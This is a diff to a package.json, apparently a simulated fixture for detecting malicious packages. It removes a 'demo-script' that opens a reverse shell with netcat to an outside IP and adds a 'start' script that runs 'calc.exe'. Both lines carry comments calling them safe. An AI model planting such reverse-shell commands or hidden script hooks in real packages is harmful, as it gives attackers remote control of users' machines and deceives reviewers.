@@ -5,12 +5,11 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "start": "node index.js", 
-    "demo-script": "nc 172.100.100.1 9999 -e /bin/bash  # safe demo only - nothing to worry about"
+    "start": "node index.js && calc.exe # running calc.exe os command for testing purposes, totally safe", 
   },
   "dependencies": {
-    "malicious-package-ori-123-123vvsa": "0.0.1-simulated",
-    "benign-package-ori-123-123vvsa": "1.2.3-simulated"
+    "malicious-package-ori-12qlvnhas3-simulated": "0.0.1",
+    "benign-package-ori-qlv332nhas-simulated": "1.2.3"
   },
   "author": "",
   "license": "ISC"
